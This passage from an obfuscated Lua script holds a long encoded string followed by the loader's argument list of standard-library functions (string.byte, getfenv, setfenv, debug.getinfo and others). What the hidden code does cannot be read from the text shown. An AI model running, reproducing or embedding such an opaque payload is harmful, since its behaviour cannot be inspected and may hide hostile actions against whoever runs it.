Y25F3Q0Y25N3Q0Y25V3Q193C333PCK3HL23H303DMA3PCO3H343GQ13HRD21K32Z239X63APR3BS33N493BGV3BSX3LC53CQZ33O83M6V32IJ32ZE311P27C21M37JL37ZA3Q2X2BM38FN3OFN3J6D3M2R39NW3K4C3JP93J8C3GF73AGQ3FVT3AWT3NZH363K31483BAS3JBG38RZ3NDU3I913B613Q353DR63OCY31SU3COV2P7310E38O139NQ331X3Q3U3ESO3MTD39Z238OO3CP427G3AGH3C8Z3IQJ3BMY3I622A03EQB2A639ON37CL3AGQ32ZI3DXC339U3AYG2M43OJ43DKU2B43C7N3CQE3MJX3D4C3E1C3A853B0K3C7M3O9G3M6D3LSH3DRR394S3K6732IQ3PU43MIH3DQ83Q4M3E633CQF3K8N32YO2MD3BV63JRI3IRB3MMO335N3MJT32Z03AT33AVX3IA53DXD2FS32YR3B3J2X13BBP3L073L2O319U38883PU93JEZ3F2538AN3B033MIQ3J873L2J3NO33OLZ3BU53IA537QR3K6A37UC331S2B438YW3BZM3Q6C3IAJ3K5O3Q623LDJ3IDH3M443LS93JA43Q653NUG3K733E2L2B43CI039Z23Q6S3C743BU53B303DRC3PBI3EQ33D4K3ONY3DQY3MHS3MXZ371M3AZ43IBP27D3CAO3K7M355L335031203IC3365C3MJR3HCH39ZI3AZL331E37SB365C31203MW4331E3BAE2GF316S37WQ35IM312031J7386C33FP2NH3B1J39SU331X3B1J3JBL3Q7C313W3Q7F3LTJ3Q7I3Q353Q7L3C773Q7O3BO33Q7Q3Q7K38JR3A022TK3CTG2TK317D335X3Q7V31E8332Z3Q7Z35CH39LU37ZA3Q843Q7B3PTA3Q8739Z83Q893GF73Q7J3C5O3Q8C3AEC3Q8E3C8N2NH3CAM3Q823Q793ONW122NH3FFX38EG328Z3A023GAW32O32K93Q7S3EQ331482GF3IIG38YY38BB317D3LTC38EG319B3LCE318631RG3Q3838C73C8N319B3IBR3AQB27D3IBR33AZ2NH38G737RP3CBK3CG03120396F3BZZ3QAG3BTW2NH399I357C37RP3QAL37RP39BL3Q9H36Y033502GF3Q9G36PF3Q9737Y7331S31203QAQ39LY3QAQ33AZ31203JS4361G3FWW3AR83QAQ3K7X3C903BZZ3A3L3NZJ3JRM375O3Q5B3K9M3C0Q3LT834VJ3IA538IG39UG3JRM3JF63BB53AYV38JY3QBL3LVV3M2A3QBP3E063QBI3B343BA23Q4Z3QBW38MJ3QBY39403QC03AYV3BA63QC33KAG39LF3A8D32CM3QC73Q2O3AYV3KLH3QCB3MLO39G73QC63OXO3M6232CM3BCY3QCK3IA539GB32GI3QCF3QCO3C0O3AYV3M663BUM3IA53BE93QCV3ESN3QBR3MWY36SQ3QD53N683JC23FLY3QCW3LC23QCP27D39H73QBQ3QDA3MK43FS43QDD3OZV3QDF3MKB3MX03C0O3IA53ICY3QCE3LOU3A9639T23N673MLH3E8I2942F43AR83QE23Q743Q4Q2AP3QE43O9O2F33NP03KME3OLV3FP73B643MXO3AT33JCT3JDH3K9F37T43QE13E633QE43BZQ39ON2MD3QCS32IQ3L3J39Z53NCE3OMS3C0O3ATM3MLD3AT33E3L2SD3Q5N3B323PUV3B323PTK3AYV3Q5U3B6A3PUA3AU33EXD38AN3FM83BBP3JDA32ME3NWN32CM3AYO3PUO3FFZ3Q2O3AT33IDG3KAG3M6J3FZ839SO3QFE3IV333OC3IV03Q2O3ATM34323IV3342Q3QFZ3BUM3ATM343N3IV3343D39TL3QFG3OOG3QEC3OOI3AAG37VK3O9Y3M443AYV3DRR3Q5G3QFD2X134473K9E3FG33NP337IL3C113QGT3O9U3Q6G3B343QGH3AS23DQD3QGK3LUU3BU53AT33JEB3QEJ3QGR311P3DUD3C6937RP37R63AYA3Q5B36XO3AYV345431733Q6Z3QBR3QC83AAG345F334J2X739GX3NI038CW3FLW3JCE3BAX371M3OGB3BTN331X38O8381I3Q93336I2GF3JS43Q7N3LQ131EF3LCE33523Q7M31EF3Q3R313W3QI131EF3PSU3B9838FN3Q7W3IYT2GF3COQ3IQ73Q9L310Z317D3Q3F310Z3AVX3IBM33122BQ31XM37RP38F9381I31863LCE2LI31NC3Q3831863QIE31863QJ13Q3V32F03B983Q7D38CN3A862163BBD376Q2GF38DK3GA33QJM3C4Y312038OV279328237RP3QJR39ZV2GF3D4C2P7312038KC3C4M37ZA3QK13Q2Z3BF02SN2GF388S33502TK3ATT3B2A3QJX3837331S2GF3QJV39LY3QJV33AZ3QAU3BBR3GAW3AR83QJV3CG02943B8J3BZZ3QKT3N6G37U032PS3CHK33423DTX3KAQ3JE23QGE3MXC3BCR3AT3346A3BU73CFF3A3E3BGD3B91346V2BR3QBL3DGE3PUA3ALA3Q5X3DGE2X12X733BB2FS38VP3QJS37ZA3QLQ3ATZ3AKE38XV3AT334753MX63AJV3ATM3IGV3LG93MX63QAV34VJ3Q9F37Z53AJV38BB39D93B6K3Q6Y35I1388S37ES3K6639J13QHS3QLU3A7V3ATF3BU53ATM3L5X31BD3QF13CPF2G5390N3QLR37RP3QMU39Z43BW23MX339HI3QM532Z03QM73AGR3KMA2X73FFX39ZX3KJ037RP390F37T02TK316S33OC381C2TK3QNC3QJC3DSN3B983QMG3B333QNE3MKX3A2Y2TK382K385D2TK38Z63C113QNW39ZV3IIG3B533Q8M39WU3QNR383F334J39U83QIV32QF2A52PS31XM34AE37SK3QO03QJG3BB538D33C7D3B8X3186316S3K9R3Q6I3C0O38E53JT43AJV39U63M4037TL31XM3NDB396Q35I137T3376Q2FS38XQ3GA33QP33QMK3AZY3KMN3AWU2X734CP3AEZ2G53QLM3QMS2FS396O3QMV331X3QPH3QMY3BXN3JRQ3EO43Q2O3QN43KNX3M6D3QN73JS23NTQ39Z239603QND31N034DI39IG2TK3QPX3QNK35TD3BBD331S310E395N3C113QQ93CL23MLE27E38ZJ3QO032Z03QO23HM439T03Q2O3QOB3LH63QIY383F3AVX38LP34VJ314831RG34G23B8X38BM39D93QQI31VV3BN23QHK3NIN3B9134GX3CP42FS39283GA33QR83QP63BX93QP831M63ATM34HS3L873QPD3IBY3BYZ2FS39DP3QPI27D3QRM3QPL39OH3QPN32YP3QN23EVP2UG34J63BU73QPT3FJ43QPV37ZA39DD3QPY316S3QQ03QNH36MB3AM73QA627A3QS3385D310E39D33C113QSF3QQC3QMH3QQF3Q2O3QQZ34KJ3CZ03BCR3QQM3L6Q3QQK3NU13BKT3BZ93QQT3CHM3QQW2BQ3QQY31H63NCN3QOY3N6O3ICD34L33QR6380I3NTC37RP399W3AYA2FS3QML3B673QMN3DLU3A2Y3QMR3CQN2FS2623AM73QJT331X3QTM381I3QTD3QRR3MWQ3BUO3C0O3QPQ34NB3KME3QRZ3D963QS137RP25W3AM7332L3QNP3FH63AQ82TK3QU43C3M3QU33QQ631SU25X3N4M37RP3QUG37RC3QQD28O123QQG3FSQ317D3Q2J3QSO3C0O3QSQ3QLF3QQO3QST39CG3QQS38AY34S932Z03QQX3C2O3QT13QMD3QT43E0F34SJ3CG02FS25H3QT9331X3QVC3QTC3JSD3QMM3AQ53ATM34SV3QPC3QTJ3C4Y2FS26Y3QTN37ZA3QVQ3QTR3QMZ3QRS32YO3QRU2QS2UG34Q13QPS3FP73AVV3QU2331X26S3QU531M63QU73FN93QU937M53QS937ZA3QW737S43QQ71326T3QUH331X3QWK3QUK3QSJ3QUN3QSL31H634RO3QQO3BUM3QUU34TF39TH3QQP3AFD3QSV38AY34UX3QSY3QKX3E0U317D3QT22EZ3QV73DRH34WF3QT726D3QVD27D3QXE3QVG3QTE3QRD2SD2X734XY3QRH3QVN3QRK2Q537JF3QTO389C37JF3AWQ3QPM3QTU3QVY3QPQ34YG3QW23NO33QW43FLX39NA37JF3QU63QPZ3QWC1K37JF3QSA2SM3I213QWI1L37JF39LY3QYH3QWO3BW43QSK3BUM3QQZ34YY3QWY3QWV312F326A3QUW3QUS38T43QUZ31RG34ZZ34VJ3QV33QX638H93FSF3QR2380O3B91350H3QVA27V37JF3C8Z1537JL3QEF3QXJ3MXO3ATM350Y3QXO2UN3QLN332B2FS3Q303QAM331X3QZQ3QXW3QTT3IUG3QXZ2TY351O3QTZ3QW32G53QW53BFZ3QY73QW93QY939ZO2TK21G3QYC37ZA3R0A3QWH31SU21H3QYI37ZA3R0G3QYL39JU3QYN3BZ93QQZ352E3QYR3BZ93QUU3JN2386L3QUX39CN3QYY3KOL3QV23QSZ3QV43QX73QV63N5L3B91354S3QT72113QZC3CXK37JL3Q713CL739ND32YN',{},40,2^16,{},"\115\116\114\105\110\103",'',string.byte,string.char,string.sub,table.concat,(math.ldexp or(function(a,b)return a*(2^b);end)),(getfenv or function()_ENV['\95\69\78\86']=_ENV;return _ENV end),setmetatable,select,next,math.floor,string.format,(unpack or table.unpack),tonumber,table.insert,string.gmatch,tostring,type,_VERSION,pcall,string.match,string.find,(debug.getinfo or debug.info),string.len,rawset,string.gsub,math.random,(table.find or function(a,b)for c,d in next,a do if d==b then return c;end;end return nil;end),rawget,_G,print,setfenv);end;
